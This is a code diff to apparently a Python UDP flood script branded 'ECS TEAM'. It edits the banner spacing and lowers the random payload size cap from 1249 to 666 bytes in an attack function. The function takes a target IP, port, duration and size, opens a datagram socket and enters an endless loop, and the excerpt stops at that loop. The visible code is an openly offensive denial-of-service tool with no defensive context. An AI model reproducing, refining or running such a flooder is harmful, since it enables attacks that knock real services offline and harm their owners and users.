@@ -22,8 +22,8 @@ def attack(ip, port, time, size, socks):
         port = max(1, min(65535, port))
     print(method)
     print("\033[95m╦══════════════════════════════════════════════════════════════╦")
-    print("\033[95m║\033[91m                         ECS TEAM                             \033[95m║")
-    fmt = '\033[95m║\033[91m                     ECS TEAM SENT                            \033[95m║'.format(
+    print("\033[95m║\033[91m                         ECS TEAM                        \033[95m║")
+    fmt = '\033[95m║\033[91m                     ECS TEAM SENT                       \033[95m║'.format(
         ip=ip,
         port='PORT {port}'.format(port=port) if port else 'random ports'
     )
@@ -31,17 +31,17 @@ def attack(ip, port, time, size, socks):
     print("╩══════════════════════════════════════════════════════════════╩")
     
     print("╦══════════════════════════════════════════════════════════════╦")
-    print("║     IP: {ip}                                              ║".format(ip=ip))
+    print("║     IP: {ip}                                                            ║".format(ip=ip))
     print("║══════════════════════════════════════════════════════════════║")
-    print("║     PORT: {port}                                                ║".format(port=port))
+    print("║     PORT: {port}                                                        ║".format(port=port))
     print("║══════════════════════════════════════════════════════════════║")
-    print("║     SIZE: {size}                                                ║".format(size=size))
+    print("║     SIZE: {size}                                                        ║".format(size=size))
     print("║══════════════════════════════════════════════════════════════║")
-    print("║     TIME: {time}                                                ║".format(time=time))
+    print("║     TIME: {time}                                                        ║".format(time=time))
     print("╩══════════════════════════════════════════════════════════════╩")
     #print("\033[95m╩══════════════════════════════════════════════════════╩")
     startup = tt()
-    size = os.urandom(min(1249, size))
+    size = os.urandom(min(666, size))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
